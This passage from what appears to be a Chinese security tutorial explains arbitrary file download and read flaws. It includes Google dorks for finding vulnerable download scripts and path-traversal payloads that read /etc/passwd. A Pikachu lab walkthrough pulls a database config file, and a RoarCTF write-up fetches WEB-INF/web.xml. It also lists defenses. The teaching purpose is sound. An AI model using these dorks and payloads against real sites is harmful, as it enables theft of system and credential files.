class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;任意文件下载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件下载&#34;&gt;&lt;/a&gt; 任意文件下载&lt;/h2&gt;
&lt;p&gt;直接下载：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://www.xx.com/a.zip&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;rel&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;external nofollow&amp;quot;&lt;/span&gt; &amp;gt;&lt;/span&gt;Download&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用header()下载：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;uploads/201607141437284653.jpg&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;header(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Content-Type: imgage/jpeg&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;header(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Content-Disposition: attachment; filename=&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;header(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Content-Lengh: &amp;#x27;&lt;/span&gt;.filesize(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;google-search&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#google-search&#34;&gt;&lt;/a&gt; Google search&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;inurl:&amp;quot;readfile.php?file=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inurl:&amp;quot;read.php?filename=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inurl:&amp;quot;download.php?file=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inurl:&amp;quot;down.php?file=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;等等...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;漏洞利用代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞利用代码&#34;&gt;&lt;/a&gt; 漏洞利用代码&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;readfile.php?file=/etc/passwd``readfile.php?file=../../../../../../../../etc/passwd``readfile.php?file=../../../../../../../../etc/passwd%00&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;1.文件被解析，则是文件包含漏洞&lt;br /&gt;
2.显示源代码，则是文件读取漏洞&lt;br /&gt;
3.提示文件下载，则是文件下载漏洞&lt;/p&gt;
&lt;h2 id=&#34;漏洞挖掘&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞挖掘&#34;&gt;&lt;/a&gt; 漏洞挖掘&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;可以用Google hacking或Web漏洞扫描器``从链接上看，形如：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• readfile.php?file=***.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• download.php?file=***.rar&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;从参数名看，形如：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;RealPath= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;FilePath= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;ﬁlepath= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;Path= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;path= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;inputFile=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;url= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;urls= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;Lang= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;dis= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;data= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;readﬁle= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;ﬁlep= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;src= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• &amp;amp;menu= &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• META-INF &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• WEB-INF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;目录符号等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;../ ..\ .\ ./等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%00 ? %23 %20 .等&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;漏洞验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞验证&#34;&gt;&lt;/a&gt; 漏洞验证&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;• index.php?f=../../../../../../etc/passwd &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• index.php?f=../index.php &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;• index.php?f=ﬁle:///etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;注：当参数f的参数值为php文件时，若是文件被解析则是文件包含漏洞，&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;若显示源码或提示下载则是文件查看与下载漏洞&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;漏洞防范&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞防范&#34;&gt;&lt;/a&gt; 漏洞防范&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://tonydeng.github.io/2016/06/13/simple-protection-measures-to-download-any-file/&#34;&gt;任意文件下载漏洞的简单防护措施&lt;/a&gt;&lt;br /&gt;
1、过滤“.”符号，使用户在url中无法回溯到上级目录。&lt;br /&gt;
2、使用正则表达式严格判断用户输入参数的格式。&lt;br /&gt;
3、php.ini配置文件中对于open_basedir进行配置，限定用户的文件访问范围。&lt;br /&gt;
4、固定目录&lt;/p&gt;
&lt;h2 id=&#34;案例&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#案例&#34;&gt;&lt;/a&gt; 案例&lt;/h2&gt;
&lt;h3 id=&#34;pikuchu靶场-文件下载测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pikuchu靶场-文件下载测试&#34;&gt;&lt;/a&gt; pikuchu靶场-文件下载测试&lt;/h3&gt;
&lt;p&gt;1、判断是否为文件上传漏洞&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105330.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105330.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;点击任意图片，发现下载了图片，复制图片下载链接查看&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png&#34;&gt;http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;查看参数名为filename，查看参数后面的值也与下载的文件名一样&lt;br /&gt;
初步判定为文件上传漏洞&lt;/p&gt;
&lt;p&gt;2、判断下载路径&lt;br /&gt;
filename的文件名是单纯的文件名，可判断是前面加了路径名，也可能是与网站在同一个目录下&lt;br /&gt;
通过URL判断文件是通过跳转到execdownload.php页面下载的，我们试试看可不可以直接下载到execdownload.php这个源码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=execdownload.php&#34;&gt;http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=execdownload.php&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105331.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105331.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现显示无法下载，说明该execdownload.php与文件不在同一个路径下，我们尝试下到上一级路径&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=../execdownload.php&#34;&gt;http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=../execdownload.php&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105332.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105332.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;成功下载，打开源码发现是在download文件夹下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105333.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105333.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;说明文件下载路径的文件夹与down_nba.php是同一级路径&lt;br /&gt;
3、尝试下载敏感文件（以下路径均通过扫描路径得到）&lt;br /&gt;
pikachu-master/inc/config.inc.php&lt;br /&gt;
当前下载路径：&lt;br /&gt;
pikachu-master/vul/unsafedownload/download/xxx.xxx&lt;br /&gt;
与vul相差3个父目录，所以加3个…/&lt;br /&gt;
完整url：&lt;br /&gt;
&lt;a href=&#34;http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=%E2%80%A6/%E2%80%A6/%E2%80%A6/inc/config.inc.php&#34;&gt;http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=…/…/…/inc/config.inc.php&lt;/a&gt;&lt;br /&gt;
下载成功，打开发现里面存在数据库相关的配置文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105334.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105334.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;小米路由器-文件读取真实测试-漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#小米路由器-文件读取真实测试-漏洞&#34;&gt;&lt;/a&gt; 小米路由器-文件读取真实测试-漏洞&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://www.seebug.org/vuldb/ssvid-98122&#34;&gt;复现&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;roarctf2019-文件读取真题复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf2019-文件读取真题复现&#34;&gt;&lt;/a&gt; RoarCTF2019-文件读取真题复现&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/ChenZIDu/article/details/103533554&#34;&gt;wp&lt;/a&gt;&lt;br /&gt;
首先看到一个页面,点击下help看看啥情况。&lt;br /&gt;
&lt;img src=&#34;2021082316105335.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105335.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现输出一串&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java.io.FileNotFoundException:&amp;#123;help.docx&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;是文件无法找到的异常信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105336.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105336.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;查询资料发现：&lt;br /&gt;
WEB-INF/web.xml泄露&lt;br /&gt;
WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：&lt;br /&gt;
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&lt;br /&gt;
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&lt;br /&gt;
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&lt;br /&gt;
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。&lt;br /&gt;
/WEB-INF/database.properties：数据库配置文件&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;漏洞成因：&lt;br /&gt;
通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;根据上文，我们先找一下WEB-INF/web.xml,POST传值&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105437.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105437.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;得到WEB-INF/web.xml文件，打开&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;web-app xmlns=&amp;quot;http://xmlns.jcp.org/xml/ns/javaee&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         xsi:schemaLocation=&amp;quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         version=&amp;quot;4.0&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;welcome-file-list&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;welcome-file&amp;gt;Index&amp;lt;/welcome-file&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/welcome-file-list&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-name&amp;gt;IndexController&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-class&amp;gt;com.wm.ctf.IndexController&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-name&amp;gt;IndexController&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;url-pattern&amp;gt;/Index&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 